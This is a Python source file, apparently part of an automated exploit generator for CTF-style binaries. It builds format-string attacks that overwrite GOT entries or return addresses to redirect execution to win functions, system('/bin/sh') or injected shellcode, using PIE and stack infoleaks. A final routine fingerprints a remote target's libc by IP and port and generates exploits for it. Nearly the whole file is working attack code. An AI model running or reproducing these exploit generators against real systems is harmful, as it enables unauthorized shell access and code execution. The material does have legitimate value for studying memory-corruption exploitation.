	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset_pie(fmt_string_vuln, elf_name, elf)

	# Where we are writing it to
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	i = 0
	for win_func in win_funcs:
		exploit_name = multi_setup_exploit(elf_name, elf, "FsGotWinFuncPieFsleak-%d" % i)
		i += 1
		if elf.arch == "i386":
			

			setup_fs_pieinfoleak_from_stack(fmt_string_vuln, elf_name, elf, exploit_name)
			write_fmt_str86(win_func, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")

		elif elf.arch == "amd64":

			setup_fs_pieinfoleak_from_stack(fmt_string_vuln, elf_name, elf, exploit_name)
			write_fmt_str64(win_func, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")

		fs_exploit_verifictation(exploit_name)
		exploits.append(exploit_name)

	return exploits

def CorrectFsGotSystem(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	functions_called_after = args[3]

	# Setup the elf_name
	exploit_name = setup_exploit(elf_name, elf, "FsGotSystem")

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)

	# The addresses we write to for the infinite loop
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	# The address of main for the infinite loop
	main_address = get_main(elf_name)

	# Get the got address of printf, and the plt address to system
	got_printf_address = get_got(elf, elf_name, "printf")
	plt_system_address = get_plt_system_address(elf_name)

	if elf.arch == "i386":
		write_fmt_str86(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name)
		write_fmt_str86(plt_system_address, got_printf_address, stack_offset, bytes_offset, position_offset, exploit_name)
		exploit_write('\ntarget.sendline("/bin/sh\\x00")\n', exploit_name)

	elif elf.arch == "amd64":
		write_fmt_str64(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name)
		write_fmt_str64(plt_system_address, got_printf_address, stack_offset, bytes_offset, position_offset, exploit_name)
		exploit_write('\ntarget.sendline("/bin/sh\\x00")\n', exploit_name)

	fs_exploit_verifictation(exploit_name)
	return [exploit_name]

def CorrectFsGotSystemPie(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	functions_called_after = args[3]
	pieInfoleaks = args[4]

	# Setup the elf_name
	exploit_name = setup_exploit(elf_name, elf, "FsGotSystemPie")

	# Setup the PIE infoleak
	pieInfoleak = pieInfoleaks[0]
	setup_pie_infoleak(pieInfoleak, exploit_name)

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset_pie(fmt_string_vuln, elf_name, elf)

	# The got address we overwrite to create the loop
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	# The address of main which we will write to the earlier got address
	main_address = get_main(elf_name)

	# The got address of printf, which we will overwrite with system
	got_printf_address = get_got(elf, elf_name, "printf")

	# Get the plt address of system
	plt_system_address = get_plt_system_address(elf_name)

	if elf.arch == "i386":
		write_fmt_str86(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")
		write_fmt_str86(plt_system_address, got_printf_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")
		exploit_write('\ntarget.sendline("/bin/sh\\x00")\n', exploit_name)

	elif elf.arch == "amd64":
		write_fmt_str64(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")
		write_fmt_str64(plt_system_address, got_printf_address, stack_offset, bytes_offset, position_offset, exploit_name, "pie_base", "pie_base")
		exploit_write('\ntarget.sendline("/bin/sh\\x00")\n', exploit_name)

	fs_exploit_verifictation(exploit_name)
	return [exploit_name]

def CorrectFsRetWinFunc(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	win_funcs = args[3]
	stack_infoleaks = args[4]

	# Setup the Stack infoleak
	stackInfoleak = stack_infoleaks[0]
	

	# Grab the needed offsets
	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)

	exploits = []

	i = 0
	# The value we are writing
	for win_func in win_funcs:
		exploit_name = multi_setup_exploit(elf_name, elf, "FsRetWinFunc-%d" % i)
		i += 1

		setup_stack_fs_infoleak(stackInfoleak, exploit_name)
		# Make the format string payload
		if elf.arch == "i386":
			write_fmt_str86(win_func, 0, stack_offset, bytes_offset, position_offset, exploit_name, 0x0, "ret_address")
		elif elf.arch == "amd64":
			write_fmt_str64(win_func, 0, stack_offset, bytes_offset, position_offset, exploit_name, 0x0, "ret_address")

		fs_exploit_verifictation(exploit_name)
		exploits.append(exploit_name)

	return exploits

def CorrectFsRetShellcode(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	stack_infoleaks = args[3]
	pie_present = args[4]

	# Setup the Stack infoleak
	stackInfoleak = stack_infoleaks[0]
	
	# Grab the needed offsets
	if pie_present == True:
		stack_offset, bytes_offset, position_offset = get_fmt_string_offset_pie(fmt_string_vuln, elf_name, elf)
	else:
		stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)		

	inp = fmt_string_vuln.inp_method

	exploits = []

	i = 0

	#shellcode, shellcode_len = get_shellcode(elf, inp)
	shellcodes = get_all_shellcode(elf, inp)
	for shellcode_list in shellcodes:
		shellcode = shellcode_list[0]
		shellcode_len = shellcode_list[1]

		exploit_name = multi_setup_exploit(elf_name, elf, "FsRetShellcode-%d" % i)
		i += 1

		setup_stack_fs_infoleak(stackInfoleak, exploit_name)

		if elf.arch == "i386":
			if inp.write_size < shellcode_len + 38:
				return []
			if inp.offset >= (shellcode_len + 38):
				shellcode_offset = inp.offset - 38
			else:
				shellcode_offset = -4

		elif elf.arch == "amd64":
			if inp.write_size < shellcode_len + 88:
				return []
			if inp.offset >= (shellcode_len + 88):
				shellcode_offset = inp.offset - 88
			else:
				shellcode_offset = -8

		if elf.arch == "i386":
			write_fmt_str_shellcode32(shellcode_offset, 0x00, stack_offset, bytes_offset, position_offset, shellcode, inp.offset, exploit_name, "ret_address", "ret_address")

		elif elf.arch == "amd64":
			write_fmt_str_shellcode64(shellcode_offset, 0x00, stack_offset, bytes_offset, position_offset, shellcode, inp.offset, exploit_name, "ret_address", "ret_address")

		fs_exploit_verifictation(exploit_name)
		exploits.append(exploit_name)

	return exploits

def CorrectFsGotShellcode(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	functions_called_after = args[3]
	stack_infoleaks = args[4]

	# Setup the exploit

	exploits = []

	# Setup the Stack infoleak
	stackInfoleak = stack_infoleaks[0]

	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)		

	# The got address we overwrite to create the loop
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	inp = fmt_string_vuln.inp_method

	i = 0

	shellcodes = get_all_shellcode(elf, inp)
	for shellcode_list in shellcodes:
		shellcode = shellcode_list[0]
		shellcode_len = shellcode_list[1]

		if elf.arch == "i386":
			if inp.write_size < shellcode_len + 38:
				return []
			else:
				shellcode_offset = inp.offset - 38


		elif elf.arch == "amd64":
			if inp.write_size < shellcode_len + 88:
				return []
			else:
				shellcode_offset = inp.offset - 88


		exploit_name = multi_setup_exploit(elf_name, elf, "FsGotShellcode-%d" % i)

		setup_stack_fs_infoleak(stackInfoleak, exploit_name)

		# Make the format string payload
		if elf.arch == "i386":
			write_fmt_str_shellcode32(shellcode_offset, got_address, stack_offset, bytes_offset, position_offset, shellcode, inp.offset, exploit_name, "ret_address")
		elif elf.arch == "amd64":
			write_fmt_str_shellcode64(shellcode_offset, got_address, stack_offset, bytes_offset, position_offset, shellcode, inp.offset, exploit_name, "ret_address")

		fs_exploit_verifictation(exploit_name)
		exploits.append(exploit_name)

	return exploits

def CorrectFsGotShellcodeFsleak(args):
	elf_name = args[0]
	elf = args[1]
	fmt_string_vuln = args[2]
	functions_called_after = args[3]

	exploits = []

	stack_offset, bytes_offset, position_offset = get_fmt_string_offset(fmt_string_vuln, elf_name, elf)		

	# The got address we overwrite to create the loop
	got_overwrite_func = functions_called_after[0]
	got_address = get_got(elf, elf_name, got_overwrite_func)

	main_address = get_main(elf_name)

	inp = fmt_string_vuln.inp_method

	i = 0

	shellcodes = get_all_shellcode(elf, inp)
	for shellcode_list in shellcodes:
		shellcode = shellcode_list[0]
		shellcode_len = shellcode_list[1]

		exploit_name = multi_setup_exploit(elf_name, elf, "FsGotShellcodeFsleak-%d" % i)
		i += 1

		# Make the format string payload
		if elf.arch == "i386":
			write_fmt_str86(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name)
			setup_fs_stack_infoleak_from_stack(fmt_string_vuln, elf_name, elf, shellcode, shellcode_len, exploit_name)
			write_fmt_str86(0x00, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "input_address")


		elif elf.arch == "amd64":
			write_fmt_str64(main_address, got_address, stack_offset, bytes_offset, position_offset, exploit_name)
			setup_fs_stack_infoleak_from_stack(fmt_string_vuln, elf_name, elf, shellcode, shellcode_len, exploit_name)
			write_fmt_str64(0x00, got_address, stack_offset, bytes_offset, position_offset, exploit_name, "input_address")

		fs_exploit_verifictation(exploit_name)
		exploits.append(exploit_name)

	return exploits

'''
+-----------------------------------------------------------+
|                    Ultimate Jutsus                        |
+-----------------------------------------------------------+
'''

def IdLibcPutsInfoleak(args):
	elf_name = args[0]
	stackVuln = args[1]
	pltFuncs = args[2]
	ipPort = args[3]

	elf = ELF(elf_name)

	fillerOutput = get_filler_input(elf_name, elf, stackVuln, pltFuncs)
	libcs = id_libcs(elf_name, elf, stackVuln, pltFuncs, fillerOutput, ipPort)

	make_libc_solidified_exploits_directory(elf_name, ipPort)

	for libc in libcs:
		gen_exploits_for_libc(elf_name, elf, libc, stackVuln, pltFuncs, fillerOutput, ipPort)

	check_libc_exploits(ipPort)
